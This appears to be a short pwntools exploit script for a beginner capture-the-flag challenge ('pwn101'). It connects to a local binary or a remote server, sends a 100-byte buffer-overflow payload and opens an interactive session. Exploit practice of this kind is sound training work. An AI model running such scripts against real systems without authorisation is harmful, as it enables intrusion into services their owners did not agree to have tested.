import argparse

from pwn import *


def arg_parse():
    parser = argparse.ArgumentParser(description="pwn101")

    local_mode = argparse.ArgumentParser(add_help=False)
    local_mode.add_argument("-e", "--executable", dest="exe", action="store", help="Local binary")

    remote_mode = argparse.ArgumentParser(add_help=False)
    remote_mode.add_argument("-s", "--server", dest="server", action="store", help="Server IP")
    remote_mode.add_argument("-p", "--port", dest="port", action="store", help="Server Port")

    subparsers = parser.add_subparsers(help="actions", dest="action")
    subparsers.add_parser("local", parents=[local_mode], help="Local execution")
    subparsers.add_parser("remote", parents=[remote_mode], help="Remote execution")
    return parser.parse_args()


if __name__ == "__main__":
    options = arg_parse()
    context.update(arch="amd64", os="linux")

    if options.action == 'local':
        p = process(options.exe)
    if options.action == 'remote':
        p = remote(options.server, options.port)

    payload = b'A'*100

    p.sendline(payload)
    p.interactive()